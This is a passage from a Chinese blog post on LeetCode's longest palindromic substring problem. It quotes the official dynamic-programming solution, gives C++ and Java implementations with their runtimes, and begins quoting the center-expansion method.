class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 本身不是一个回文串；</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>&gt;</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i &gt; j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6986em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>，此时 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">s[i, j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 本身不合法。</p><p>那么我们就可以写出动态规划的状态转移方程：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∧</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mi>i</mi></msub><mo>=</mo><mo>=</mo><msub><mi>S</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(i, j) = P(i+1, j-1) \wedge (S_i == S_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">==</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>也就是说，只有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo>:</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">s[i+1:j-1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span> 是回文串，并且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 个字母相同时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo>:</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">s[i:j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 才会是回文串。</p><p>上文的所有讨论是建立在子串长度大于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> 的前提之上的，我们还需要考虑动态规划中的边界条件，即子串的长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>。对于长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 的子串，它显然是个回文串；对于长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> 的子串，只要它的两个字母相同，它就是一个回文串。因此我们就可以写出动态规划的边界条件：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mtext>true</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mi>i</mi></msub><mo>=</mo><mo>=</mo><msub><mi>S</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases} P(i, i) = \text{true} \\ P(i, i+1) = ( S_i == S_{i+1} ) \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord text"><span class="mord">true</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">==</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>根据这个思路，我们就可以完成动态规划了，最终的答案即为所有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mtext>true</mtext></mrow><annotation encoding="application/x-tex">P(i, j) = \text{true}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord text"><span class="mord">true</span></span></span></span></span> 中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">j-i+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>（即子串长度）的最大值。注意：在状态转移方程中，我们是从长度较短的字符串向长度较长的字符串进行转移的，因此一定要注意动态规划的循环顺序。</p><p>作者：LeetCode-Solution</p></blockquote><p>这里用 c++ 实现一遍：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(n &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">bool</span>&gt;&gt; <span class="built_in">b_e</span>(n, vector&lt;<span class="keyword">bool</span>&gt;(n));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            b_e[i][i] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">2</span>; len &lt;= n; len++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">int</span> j = i + len - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(j &gt;= n) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(s[i] != s[j]) &#123;</span><br><span class="line">                    b_e[i][j] = <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(j - i &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                        b_e[i][j] = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        b_e[i][j] = b_e[i + <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(b_e[i][j] &amp;&amp; j - i + <span class="number">1</span> &gt; max) &#123;</span><br><span class="line">                    max = j - i + <span class="number">1</span>;</span><br><span class="line">                    begin = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s.<span class="built_in">substr</span>(begin, max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>568 ms</strong></p></li><li><p>内存消耗: <strong>29.5 MB</strong></p></li></ul><p>动态规划的方法在效率上确实没眼看，甚至我的代码都要优秀很多，但不得不说，用二维数组来做题是我没有想过的，原理还是很巧妙的。就做题思想来说，作为小白，要学习的真的太多了，希望对算法的学习能成功从刷题开始一直深入。如果有小白也刷到这里，应该也会感到很无力吧，愿大家都能坚持到底。哦，才第五题啊，那没事了~</p><p>继续练习练习 Java 实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(n &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">boolean</span>[][] b_e = <span class="keyword">new</span> <span class="keyword">boolean</span>[n][n];</span><br><span class="line">        <span class="keyword">char</span>[] s0 = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            b_e[i][i] = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">2</span>; len &lt;= n; len++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">int</span> j = i + len - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(j &gt;= n) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(s0[i] != s0[j]) &#123;</span><br><span class="line">                    b_e[i][j] = <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(j - i &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                        b_e[i][j] = <span class="keyword">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        b_e[i][j] = b_e[i + <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(b_e[i][j] &amp;&amp; j - i + <span class="number">1</span> &gt; max) &#123;</span><br><span class="line">                    max = j - i + <span class="number">1</span>;</span><br><span class="line">                    begin = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s.substring(begin, begin + max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>165 ms</strong></p></li><li><p>内存消耗: <strong>42.9 MB</strong></p></li></ul><p>官方题解的第二种解法：</p><h4 id="中心扩展算法">中心扩展算法</h4><blockquote><p><strong>思路与算法</strong></p><p>我们仔细观察一下方法一中的状态转移方程：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mspace width="1em"/><mtext>true</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mspace width="1em"/><mo stretchy="false">(</mo><msub><mi>S</mi><mi>i</mi></msub><mo>=</mo><mo>=</mo><msub><mi>S</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mspace width="1em"/><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∧</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mi>i</mi></msub><mo>=</mo><mo>=</mo><msub><mi>S</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases} P(i, i) &amp;=\quad \text{true} \\ P(i, i+1) &amp;=\quad ( S_i == S_{i+1} ) \\ P(i, j) &amp;=\quad P(i+1, j-1) \wedge (S_i == S_j) \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.91em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35em;"><span style="top:-2.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.192em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width='0.8889em' height='0.316em' style='width:0.8889em' viewBox='0 0 888.89 316' preserveAspectRatio='xMinYMin'><path d='M384 0 H504 V316 H384z M384 0 H504 V316 H384z'/></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width='0.8889em' height='0.316em' style='width:0.8889em' viewBox='0 0 888.89 316' preserveAspectRatio='xMinYMin'><path d='M384 0 H504 V316 H384z M384 0 H504 V316 H384z'/></svg></span></span><span style="top:-4.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.85em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.53em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.91em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord text"><span class="mord">true</span></span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord 